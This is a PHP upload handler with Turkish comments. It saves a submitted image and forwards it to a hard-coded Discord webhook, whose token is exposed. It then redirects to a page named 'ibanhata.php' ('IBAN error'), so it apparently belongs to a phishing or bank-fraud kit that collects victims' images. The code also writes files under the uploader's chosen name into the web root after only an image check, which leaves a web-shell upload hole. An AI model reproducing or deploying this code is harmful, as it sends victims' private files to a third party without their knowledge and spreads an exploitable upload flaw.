<?php
if(isset($_POST["submit"])){
    $targetDir = ""; // Resimlerin kaydedileceği klasörün yolu
    $targetFile = $targetDir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($targetFile,PATHINFO_EXTENSION));

    // Dosyanın resim olup olmadığını kontrol et
    if(isset($_FILES["fileToUpload"])){
        $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
        if($check !== false) {
         
            $uploadOk = 1;
        } else {
            echo "Dosya bir resim değil.";
            $uploadOk = 0;
        }
    }

    // Dosyayı kaydet ve Discord Webhook'a gönder
    if ($uploadOk == 1) {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "Lutfen Bekleyin..";

            // Discord Webhook URL'nizi buraya girin
            $webhookUrl = "https://discord.com/api/webhooks/1117956434169180170/POzerMkTgVb7F2jmzJQfQ8L07GjXft6cQTy1dYTNxLZhLMDML8FJ4AINQzdBMQfY19ui";

            // Resim dosyasını oluştur
            $file = new CURLFile($targetFile, mime_content_type($targetFile), basename($targetFile));

            // Webhook mesajı oluştur
            $payload = [
                "content" => "Yeni bir resim yüklendi!",
                "file" => $file
            ];

            // Webhook'a isteği gönder
            $ch = curl_init($webhookUrl);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data"]);
            $response = curl_exec($ch);
            curl_close($ch);

            // Başarı durumunda, 2 saniye sonra aynı sayfaya yönlendirme yap
            header("refresh:2;url=./ibanhata.php");
        } else {
            echo "Dosya yükleme hatası.";
        }
    }
}
?>
<meta http-equiv="refresh" content="0; url=./ibanhata.php">
